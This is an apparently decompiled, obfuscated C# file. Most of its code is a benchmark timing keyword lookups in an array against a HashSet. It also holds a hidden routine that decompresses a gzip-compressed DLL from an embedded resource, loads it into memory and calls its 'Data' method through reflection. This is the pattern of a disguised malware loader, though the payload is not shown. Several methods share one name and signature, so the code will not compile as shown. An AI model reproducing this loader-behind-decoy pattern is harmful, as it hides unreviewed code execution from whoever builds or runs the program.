using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;

namespace Yntmgnmjwxmbnwlr;

public sealed class i
{
	private static readonly string[] m_a = new string[77]
	{
		"abstract", "event", "new", "struct", "as", "explicit", "null", "switch", "base", "extern",
		"object", "this", "bool", "false", "operator", "throw", "break", "finally", "out", "true",
		"byte", "fixed", "override", "try", "case", "float", "params", "typeof", "catch", "for",
		"private", "uint", "char", "foreach", "protected", "ulong", "checked", "goto", "public", "unchecked",
		"class", "if", "readonly", "unsafe", "const", "implicit", "ref", "ushort", "continue", "in",
		"return", "using", "decimal", "int", "sbyte", "virtual", "default", "interface", "sealed", "volatile",
		"delegate", "internal", "short", "void", "do", "is", "sizeof", "while", "double", "lock",
		"stackalloc", "else", "long", "static", "enum", "namespace", "string"
	};

	private static readonly HashSet<string> b = new HashSet<string>
	{
		"abstract", "event", "new", "struct", "as", "explicit", "null", "switch", "base", "extern",
		"object", "this", "bool", "false", "operator", "throw", "break", "finally", "out", "true",
		"byte", "fixed", "override", "try", "case", "float", "params", "typeof", "catch", "for",
		"private", "uint", "char", "foreach", "protected", "ulong", "checked", "goto", "public", "unchecked",
		"class", "if", "readonly", "unsafe", "const", "implicit", "ref", "ushort", "continue", "in",
		"return", "using", "decimal", "int", "sbyte", "virtual", "default", "interface", "sealed", "volatile",
		"delegate", "internal", "short", "void", "do", "is", "sizeof", "while", "double", "lock",
		"stackalloc", "else", "long", "static", "enum", "namespace", "string"
	};

	private static byte[] a(byte[] a)
	{
		if (a == null)
		{
			return null;
		}
		MemoryStream memoryStream = new MemoryStream(a);
		try
		{
			MemoryStream memoryStream2 = new MemoryStream();
			try
			{
				BufferedStream bufferedStream = new BufferedStream(new GZipStream(memoryStream, CompressionMode.Decompress));
				try
				{
					bufferedStream.CopyTo(memoryStream2);
				}
				finally
				{
					((IDisposable)bufferedStream).Dispose();
				}
				return memoryStream2.ToArray();
			}
			finally
			{
				((IDisposable)memoryStream2).Dispose();
			}
		}
		finally
		{
			((IDisposable)memoryStream).Dispose();
		}
	}

	private static Assembly a()
	{
		MemoryStream memoryStream = new MemoryStream();
		try
		{
			string name = "Yntmgnmjwxmbnwlr.Qibmuipkkozm.dll";
			Assembly.GetExecutingAssembly().GetManifestResourceStream(name)!.CopyTo(memoryStream);
			return AppDomain.CurrentDomain.Load(a(memoryStream.ToArray()));
		}
		finally
		{
			((IDisposable)memoryStream).Dispose();
		}
	}

	public static string a()
	{
		Type[] exportedTypes = i.a().GetExportedTypes();
		int num = 0;
		Type type;
		while (true)
		{
			if (num < exportedTypes.Length)
			{
				type = exportedTypes[num];
				if (type.FullName == "Qibmuipkkozm.ClassLibrary")
				{
					break;
				}
				num++;
				continue;
			}
			return "";
		}
		object target = Activator.CreateInstance(type);
		return type.InvokeMember("Data", BindingFlags.InvokeMethod, null, target, null) as string;
	}

	public static void a()
	{
		string[] array = "This is a short test string that will show the typeof behavior expected".Split(new char[1] { ' ' });
		Stopwatch stopwatch = new Stopwatch();
		Stopwatch stopwatch2 = new Stopwatch();
		int num = 0;
		int num2 = 0;
		for (int l = 0; l < 100; l++)
		{
			foreach (string item in array)
			{
				b.Contains(item);
			}
			foreach (string value in array)
			{
				i.m_a.Contains(value);
			}
		}
		stopwatch.Start();
		for (int num3 = 0; num3 < 500000; num3++)
		{
			foreach (string value2 in array)
			{
				if (i.m_a.Contains(value2))
				{
					num++;
				}
			}
		}
		stopwatch.Stop();
		stopwatch2.Start();
		for (int num5 = 0; num5 < 500000; num5++)
		{
			foreach (string item2 in array)
			{
				if (b.Contains(item2))
				{
					num2++;
				}
			}
		}
		stopwatch2.Stop();
		Console.WriteLine($"Array: {500000} iterations, {num} matches, {stopwatch.ElapsedMilliseconds} ms");
		Console.WriteLine($"HashSet: {500000} iterations, {num2} matches, {stopwatch2.ElapsedMilliseconds} ms");
	}
}
